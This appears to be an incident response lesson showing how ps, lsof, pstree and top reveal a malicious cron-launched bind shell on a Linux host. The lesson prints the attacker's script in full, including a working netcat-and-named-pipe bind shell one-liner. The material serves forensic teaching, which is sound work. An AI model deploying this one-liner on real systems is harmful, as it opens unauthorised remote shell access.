In Linux, a _process_ is a running instance of a program. When you execute a program or command in Linux, the operating system creates a process for running that program. Each process has its unique identifier called a **Process ID (PID)**, which helps the operating system to manage and track it.

Processes can have parent-child relationships, forming a hierarchical structure. When one process spawns another process (for example, when one shell session spawns an additional process in a subshell), the new process becomes the **child** of the process that created it, referred to as its **parent**. This relationship is essential for managing processes and resource allocation within the operating system.

Various tools and utilities can be employed to inspect the running processes on a system. Using this enumeration, we can seek to identify malicious activity or suspicious parent-child process relationships.

ps

The `ps` command is a versatile utility in UNIX-like operating systems that reports a snapshot of the active processes on the system. By default, it displays information about processes associated with the current (active running) console session, but it can also be used to gather system-wide and other user's process information. The utility retrieves this information by reading files in the `/proc` virtual filesystem, a hierarchical directory structure corresponding to each process on the running system. To run the command, simply type `ps`:

Viewing Processes with ps

```shell-session
investigator@tryhackme:~$ ps
    PID TTY          TIME CMD
   1335 pts/0    00:00:00 bash
   1745 pts/0    00:00:00 ps
```

As seen above, the command provides its output in a table-like format with the following columns:

|   |   |
|---|---|
|**PID:**|A unique identifier (Process ID) for each process.|
|**TTY:**|The terminal associated with the process.|
|**TIME:**|The cumulative CPU time consumed by the process.|
|**CMD:**|The command associated with the process.|

It is also possible to view processes specific to a user (Janice) by using the `-u` or `--user` option followed by the user's username:

Viewing Janice's Processes with ps

```shell-session
investigator@tryhackme:~$ ps -u janice
    PID TTY          TIME CMD
    773 ?        00:00:00 sh
    775 ?        00:00:00 abzkd83o4jakxld
    781 ?        00:00:00 cat
    782 ?        00:00:00 sh
    783 ?        00:00:00 nc
```

A handy set of options to provide with the `ps` command is `-eFH`, which combines several options to return a comprehensive overview of all processes running on the system in a hierarchical format, regardless of the terminal or session to which they are attached. This set of options makes it a valuable tool for system monitoring and forensic analysis:

Viewing All Processes with ps

```shell-session
investigator@tryhackme:~$ ps -eFH
UID          PID    PPID  C    SZ   RSS PSR STIME TTY          TIME CMD
root           2       0  0     0     0   0 15:37 ?        00:00:00 [kthreadd]
root           3       2  0     0     0   0 15:37 ?        00:00:00   [rcu_gp]
...
root         706       1  0  2137  2740   0 22:07 ?        00:00:00   /usr/sbin/cron -f
root         769     706  0  2570  2596   0 22:08 ?        00:00:00     /usr/sbin/CRON -f
janice       773     769  0   654   516   0 22:08 ?        00:00:00       /bin/sh -c /home/janice/abzkd83o4jakxld.sh
janice       775     773  0  2156  2148   0 22:08 ?        00:00:00         /bin/bash /home/janice/abzkd83o4jakxld.sh
janice       781     775  0  1845   396   0 22:08 ?        00:00:00           cat /tmp/f
janice       782     775  0   654   452   0 22:08 ?        00:00:00           /bin/sh -i
janice       783     775  0   815   664   0 22:08 ?        00:00:00           nc -l 0.0.0.0 4444
...
ubuntu      1681       1  0 39155  5728   0 15:39 ?        00:00:00   /usr/libexec/gvfsd-metadata
```

**Note:** As PIDs are sequentially assigned, you will likely have different PID and PPID values listed.

As seen in the above command, we select all processes with `-e`, return the results in extra full format `-F`, and show the process hierarchy (forest) `-H`.

This command will produce a large output, so it is best to paginate the output by piping it to `less` or using `grep` to filter the output. However, when scrolling through the list, we can identify several suspicious processes (**781**, **782** and **783**) that may hint at malicious activity. We can also identify that these three processes have the parent of **PID: 775**, which is useful for our notes.

Note again that the PIDs are sequentially generated and will be different on each machine, but in the above example, the following process command line values are worth investigating:

`nc -l 0.0.0.0 4444`

In this command, the Netcat utility listens on all available network interfaces (open to connections from any IP address) on port 4444. Seeing this command in a running process is suspicious as it can suggest an attempt to establish unauthorised access to the system through a **bind shell**. A bind shell works when a host binds to a specific port, awaits incoming network connections, and spawns a shell, granting the connecting entity command-line access to the host.

`cat /tmp/f` and `/bin/sh -i`

These two commands may suggest how the bind shell spawns its eventual command-line (`/bin/sh`) shell for whoever connects to the Netcat listener. Specifically, the file creation of `/tmp/f` suggests an attacker may have created a **named pipe** to transmit data bidirectionally between processes, as it is a common indicator of a bind shell one-liner.

We can further confirm that a named pipe was created by listing the file and noting the `p` file type indicator in the permissions section of the output, which denotes a named pipe:

Listing the Named Pipe in the /tmp Folder

```shell-session
investigator@tryhackme:~$ ls -l /tmp/f
prw-rw-r-- 1 janice janice 0 Mar 13 15:54 /tmp/f
```

Putting these processes together, we can identify that the Janice user has executed a bind shell listener to provide a connecting party command-line access to the host.

lsof

Let's explore a more powerful way to report a list of all open files and their associated processes within the running system. `lsof` (List Open Files) is a utility that lists information about files opened by processes on a system. In this case, to view any files open by the Netcat process we identified earlier, we can run `lsof` and provide the PID (783):

Listing Open Files with lsof

```shell-session
investigator@tryhackme:~$ sudo lsof -p 783
...
COMMAND PID   USER   FD   TYPE DEVICE SIZE/OFF    NODE NAME
nc      783 janice  cwd    DIR  202,1     4096 1024049 /home/janice
nc      783 janice  rtd    DIR  202,1     4096       2 /
...
nc      783 janice    0r  FIFO   0,13      0t0   28393 pipe
nc      783 janice    1w  FIFO  202,1      0t0    3437 /tmp/f
nc      783 janice    2u   REG  202,1        0    2621 /tmp/#2621 (deleted)
nc      783 janice    3u  IPv4  28400      0t0     TCP *:4444 (LISTEN)
```

**Note:** Replace **783** with the PID you identified earlier, executing `nc -l 0.0.0.0 4444`.

The above output tells us a couple of important things. It confirms the existence of named pipes (FIFO) associated with the `/tmp/f` file, which are being written to and read from. Additionally, it indicates that the process is listening on TCP port 4444, indicating that it might be functioning as a server or a listener. This information aligns with our findings of a bind shell setup where data transmission is facilitated bidirectionally between processes using named pipes.

Next, we should further analyse the process of parent-child relationships using `pstree`. Doing so will tell us where the process originated and provide insights into potential attack vectors.

pstree

`pstree` is a command-line utility that displays processes visually as a tree, showing the parent-child relationships between processes. This utility can help identify the origin of the suspicious processes and understand their relationship to other processes in the system.

We can perform a deeper process analysis of the parent process we identified above (PID: 775) using `pstree` and provide options to list its parent processes (`-s`) and their corresponding PIDs (`-p`):

Illustrating the Process Hierarchy with pstree

```shell-session
investigator@tryhackme:~$ pstree -p -s 775
systemd(1)───cron(706)───cron(769)───sh(773)───abzkd83o4jakxld(775)─┬─cat(781)
                                                                       ├─nc(783)
                                                                       └─sh(782)
```

**Note:** Replace **775** with the PID of the parent process you identified earlier.

In the above output, we can see a hierarchical view of the process tree, where each process is listed along with its parent process and PID. From this tree, we can see that the Netcat (nc) process was spawned by intermediary processes (**abzkd83o4jakxld** and **sh**), which are executing scripts spawned by a cronjob (cron).

Now that we have a better idea of how the Netcat process was spawned, we can focus on the parent shell and cron processes to see the commands that were run. To do this, we can return to the `ps` command in full-format listing (`-f`) and filter by those specific PIDs we found in the `pstree` output:

Listing Processes with ps

```shell-session
investigator@tryhackme:~$ ps -f 769 773 775 783
UID          PID    PPID  C STIME TTY      STAT   TIME CMD
root         769     706  0 22:08 ?        S      0:00 /usr/sbin/CRON -f
janice       773     769  0 22:08 ?        Ss     0:00 /bin/sh -c /home/janice/abzkd83o4jakxld.sh
janice       775     773  0 22:08 ?        S      0:00 /bin/bash /home/janice/abzkd83o4jakxld.sh
janice       783     775  0 22:08 ?        S      0:00 nc -l 0.0.0.0 4444
```

**Note:** Replace **769**, **773**, **775**, and **783** with the PIDs you identified with `pstree`.

This output concludes that a suspicious shell script (`abzkd83o4jakxld.sh`) has been executed from the `/home/janice` directory. If we view the contents of this file, we can confirm that it matches the indicators of a common bind shell one-liner, as discussed earlier:

Viewing the Contents of the Suspicious .sh Script

```shell-session
investigator@tryhackme:~$ cat /home/janice/abzkd83o4jakxld.sh 
#!/bin/bash

# Set the path to the lock file
LOCKFILE="/tmp/abzkd83o4jakxld.lock"

# Check if lock file exists
if [ -e "$LOCKFILE" ]; then
    echo "Script is already running. Exiting."
    exit 1
fi

# Create lock file
touch "$LOCKFILE"

# Main command
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l 0.0.0.0 4444 > /tmp/f

# Remove lock file
rm -f "$LOCKFILE"
```

In summary, this main command sequence (under # Main command) creates a named pipe, reads from it, and passes the data to a shell (`/bin/sh`) in interactive mode (`-i`). The remaining bits of the file seem complicated, but establishing a **lock file** is just one way to ensure that only one instance of the bind shell runs at a time. The attacker of this scenario likely set up this command sequence to establish persistence and enable future remote connections for malicious activities.

top

So far, we've explored static snapshots of running processes using commands like `ps` and `pstree`. While these tools provide valuable insights into the system's current state, they lack real-time monitoring capabilities. `top` provides a continuously updated display of system processes sorted by various criteria, such as CPU or memory usage. It dynamically refreshes its output, allowing you to observe real-time changes. It also offers a powerful interactive interface to sort and filter processes on the fly.

We can filter the output to only show processes related to the "Janice" user (`-u janice`), update dynamically every 5 seconds (`-d 5`), and display the full command paths (`-c`):

Listing Real-Time Processes with top

```shell-session
investigator@tryhackme:~$ top -d 5 -c -u janice
...
    PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND                                                                                                                                     
    773 janice    20   0    2616    516    448 S   0.0   0.1   0:00.00 /bin/sh -c /home/janice/abzkd83o4jakxld.sh                                                                                                  
    775 janice    20   0    8624   2148   1904 S   0.0   0.2   0:00.00 /bin/bash /home/janice/abzkd83o4jakxld.sh                                                                                                   
    781 janice    20   0    7380    396    328 S   0.0   0.0   0:00.03 cat /tmp/f                                                                                                                                  
    782 janice    20   0    2616    452    388 S   0.0   0.0   0:00.00 /bin/sh -i                                                                                                                                  
    783 janice    20   0    3260    656    568 S   0.0   0.1   0:00.00 nc -l 0.0.0.0 4444
```

You can press the `q` key to exit this view.

Identifying Suspicious Parent-Child Process Relationships

Identifying suspicious parent-child process relationships is essential to the IR process and can quickly confirm or rule out malicious activity. The best way to recognise what is abnormal is to establish a baseline for normal behaviour specific to your systems, environment, and organisation. This baseline should include typical processes, relationships, and resource usage under normal operating conditions.

For example, if an Apache web server process owned by the standard _www-data_ user spawns a bash child process, it could indicate malicious activity such as a command injection or remote code execution. In a typical web server environment, the Apache process handles incoming HTTP requests and serves web pages or executes server-side scripts, usually within a restricted environment. However, if a bash shell is spawned as a child process of the Apache server process, it suggests that the server may have been compromised or that malicious code is being executed.

In most cases, monitoring tools and SIEM solutions can be tuned proactively to baseline the typical behaviour of the system and alert on process and process relationship occurrences that stray from this baseline.